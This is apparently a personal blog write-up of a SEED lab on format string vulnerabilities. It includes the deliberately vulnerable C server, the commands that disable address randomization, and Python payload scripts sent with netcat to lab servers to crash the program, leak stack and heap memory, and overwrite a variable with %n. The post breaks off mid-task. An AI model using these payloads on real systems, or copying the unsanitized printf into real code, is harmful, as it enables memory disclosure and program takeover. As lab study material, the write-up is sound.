---
layout: post
title: Format String Attack
excerpt:
description: [code injection]
---

A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.

In C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. The issue with format strings arise when programs allow users to provide the entire or part of the contents in a format string and such inputs are not sanitized. Malicious users can use the opportunity to get
the program to run arbitrary code.

The basic idea behind a format string attack is that an attacker can include additional format specifiers in the format string to access data or execute code that they should not have access to. For example, an attacker can use the %x specifier to read values from the stack, or %n to write to arbitrary memory locations.

Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.

In this post, I aim to document my findings and observations while performing a SEED lab.

<details>
<summary>Lab Notes</summary>
<div markdown="1">

Address randomization is disabled.
```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```
The server program is compiled such that the stack is executable.
```bash
-z execstack
```
Server details
```
The server hosting the 32-bit vulnerable program is at 10.9.0.5
The server hosting the 64-bit vulnerable program is at 10.9.0.6
The servers listens to port 9090 and invoke the appropriate vulnerable program when it receives a TCP connection.
```
</div></details>

<details>
<summary>The Vulnerable Program</summary>
<div markdown="1">

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 10 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif


#if __x86_64__
  unsigned long target = 0x1122334455667788;
#else
  unsigned int  target = 0x11223344;
#endif 

char *secret = "A secret message\n";

void dummy_function(char *str);

void myprintf(char *msg)
{
#if __x86_64__
    unsigned long int *framep;
    // Save the rbp value into framep
    asm("movq %%rbp, %0" : "=r" (framep));
    printf("Frame Pointer (inside myprintf):      0x%.16lx\n", (unsigned long) framep);
    printf("The target variable's value (before): 0x%.16lx\n", target);
#else
    unsigned int *framep;
    // Save the ebp value into framep
    asm("movl %%ebp, %0" : "=r"(framep));
    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
    printf("The target variable's value (before): 0x%.8x\n",   target);
#endif

    // This line has a format-string vulnerability
    printf(msg);

#if __x86_64__
    printf("The target variable's value (after):  0x%.16lx\n", target);
#else
    printf("The target variable's value (after):  0x%.8x\n",   target);
#endif

}


int main(int argc, char **argv)
{
    char buf[1500];


#if __x86_64__
    printf("The input buffer's address:    0x%.16lx\n", (unsigned long) buf);
    printf("The secret message's address:  0x%.16lx\n", (unsigned long) secret);
    printf("The target variable's address: 0x%.16lx\n", (unsigned long) &target);
#else
    printf("The input buffer's address:    0x%.8x\n",   (unsigned int)  buf);
    printf("The secret message's address:  0x%.8x\n",   (unsigned int)  secret);
    printf("The target variable's address: 0x%.8x\n",   (unsigned int)  &target);
#endif

    printf("Waiting for user input ......\n"); 
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Received %d bytes.\n", length);

    dummy_function(buf);
    printf("(^_^)(^_^)  Returned properly (^_^)(^_^)\n");

    return 1;
}

// This function is used to insert a stack frame between main and myprintf.
// The size of the frame can be adjusted at the compilation time. 
// The function itself does not do anything.
void dummy_function(char *str)
{
    char dummy_buffer[BUF_SIZE];
    memset(dummy_buffer, 0, BUF_SIZE);

    myprintf(str);
}
```
</div></details>

<br>

###  Crashing the Program

This task involves crashing a 32-bit vulnerable program runnning on a remote server. The lab has been designed in such a way that when the vulnerable program runs normally, it prints out some essential values that we would need to practice a format string attack.

So we first send a benign message to the server to get these values.
```bash
echo hello | nc -w5 10.9.0.5 9090
```

**image**

When a program uses format string, the function using the format string takes it values from the stack.

Take for example, a program that uses the below format string:
```c
#include <stdio.h>

int main() {
  char name[] = "John Doe";
  char planet[] = "Earth";
  printf("My name is %s and I am from planet %s", name, planet);
}
```
When the stack is built, the optional arguments (name and planet) are placed right above the format string argument. Based on the number of format specifiers, the program tries to access the memory addresses of these optional arguments. Thus if for any reason the format  specifiers are more than the optional arguments provided, the program will try to read the memory address of an area it has no access to leading to a segmentation fault and crashing the program.

To crash the program, we need to introduce format specifiers so program will try to read the memory address of an area it has no access to leading to a segmentation fault. In this case, one format specifier seems to be enough to crash the program.
```bash
echo %s | nc -w5 10.9.0.5 9090
```

**image**

We can tell that the format program has crashed because it did not print out "Returned properly" and a few smiley faces.

<br>

### Printing Out the Server Program’s Memory

The objective of this task is to get the server to print out some data from its memory. 

#### Stack Data

When we use the "%x" format specifier, it instructs the program to access a memoey location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.

Thus our input will start with a value we know i.e. AAAA = \x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.

```python
#!/usr/bin/python3
import sys

# Start input with a content we can easily recognize
content = ("AAAA").encode('latin-1')

# Append multiple format specifiers
content += ("_%x" * 80).encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**

After a number of trial and error, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to  print out the first four bytes of my input.

#### Heap Data

There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is `0x080b4008`. In order to print out the value stored in this memory address, we will use `0x080b4008` as the first value in our input, pad it with 63 `%x` so that our program will not crash, then print out the secret message with `%s` to complete the offset.

Our initial code will be modified to achieve this
```python
#!/usr/bin/python3
import sys

# Start input with the memory address of secret message
content = (0x080b4008).to_bytes(4,byteorder='little')

# Append multiple format specifiers to prevent the program from crashing
content += ("_%x" * 63).encode('latin-1')

# print out the value stored in 0x080b4008
content += ("_%s").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

**image**

<br>

### Modifying the Server Program’s Memory

The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program; attackers can change the behavior of the program if they can modify this value.
We know that the memory address of the target variable is `0x080e5068`

#### Changing the value to a different value.

In this sub-task, we need to change the content of
the target variable to something else. Your task is considered as a success if you can change it to a
different value, regardless of what value it may be. The address of the target variable can be found
from the server printout.

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of the target variable
content = (0x080e5068).to_bytes(4,byteorder='little')

# Append multiple format specifiers to prevent the program from crashing
content += ("%x" * 63).encode('latin-1')

# Access 0x080b4008 and overwrite it's content
content += ("%n").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

**image**

#### Changing the value to 0x5000.

In this sub-task, we need to change the content of the
target variable to a specific value 0x5000. Your task is considered as a success only if the variable’s value becomes 0x5000.

**image**

```python
#!/usr/bin/python3
import sys

# Initialize the content array
#N = 1500
#content = bytearray(0x0 for i in range(N))

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
#exploit = "%s"*12 + "%n"
content = (0x080e5068).to_bytes(4,byteorder='little')
#content = ("AAAA").encode('latin-1')
content += ("%.330x" * 62).encode('latin-1')
content += ("%.16x").encode('latin-1')
content += ("%n").encode('latin-1')
content += ("\n").encode('latin-1')

# The line shows how to store the string s at offset 8
#fmt  = (s).encode('latin-1')
#content[8:8+len(fmt)] = fmt

#content = exploit.encode('latin-1')



# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

**image**

#### Changing the value to 0xAABBCCDD.

This sub-task is similar to the previous one, except
that the target value is now a large number. In a format string attack, this value is the total number of
characters that are printed out by the printf() function; printing out this large number of characters
may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of
%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 2
16
characters does not take much time. More details can be found in the SEED book.






